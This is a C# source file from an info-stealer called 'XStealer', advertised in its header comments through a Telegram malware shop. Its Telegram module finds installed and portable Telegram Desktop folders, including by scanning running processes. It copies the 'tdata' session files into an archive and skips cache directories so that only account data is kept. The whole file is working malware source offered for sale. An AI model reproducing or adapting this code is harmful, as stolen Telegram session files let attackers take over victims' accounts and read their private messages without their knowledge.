// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class Telegram
    {
        // Список директорий и файлов для обхода
        private static readonly string[] BypassDirAndFiles = new string[] { "dumps", "temp", "user_data", "user_data#2", "tdummy", "emoji", "modules", "Telegram.exe", "log.txt", ".json", "dictionaries" };

        /// <summary>
        /// Метод для получения данных из установочной Телеграммы
        /// </summary>
        public static void GetInstalledData()
        {
            // Installed Path Telegram
            if (Directory.Exists(GlobalPaths.TdataPath))
            {
                // Перебираем все файлы в папках
                foreach (string d in Directory.EnumerateFiles(GlobalPaths.TdataPath, "*", SearchOption.AllDirectories))
                {
                    // Исключаем не нужные папки
                    if (!BypassDirAndFiles.Any(d.Contains))
                    {
                        ZipEx.AddKeyPairStream(d?.Replace(GlobalPaths.TdataPath, "TelegramFiles/Installed/tdata/"), ConverterEx.ToBytes(false, d));
                    }
                }
            }
        }

        /// <summary>
        /// Метод для получения данных из портативной версии Телеграммы
        /// </summary>
        public static void GetPortableData()
        {
            try
            {
                // Перебираем все процессы и ищем из списка процесс Telegram.exe
                Process[] processes = Process.GetProcesses();
                foreach (Process proc in processes)
                {
                    if (proc.ProcessName.StartsWith("Telegram"))
                    {
                        // Получаем имя директории процесса телеграм
                        string TelegaDir = Path.GetDirectoryName(FileX.GetMainModuleFileName(proc));

                        if (Directory.Exists(TelegaDir) && !TelegaDir.StartsWith(GlobalPaths.AppData, StringComparison.OrdinalIgnoreCase))
                        {
                            try
                            {
                                foreach (string dirPath in Directory.EnumerateDirectories(TelegaDir, "*", SearchOption.AllDirectories).Where(dirPath => !BypassDirAndFiles.Any(dirPath.Contains)))
                                {
                                    foreach (string newPath in Directory.EnumerateFiles(dirPath, "*.*", SearchOption.TopDirectoryOnly).Where(newPath => !BypassDirAndFiles.Any(newPath.Contains)).Where(newPath => new FileInfo(newPath).Length > 0))
                                    {
                                        ZipEx.AddKeyPairStream(newPath?.Replace(TelegaDir, "TelegramFiles/Portable/"), ConverterEx.ToBytes(false, newPath));
                                    }
                                }
                            }
                            catch { continue; }
                        }
                    }
                }
            }
            catch { }
        }
    }
}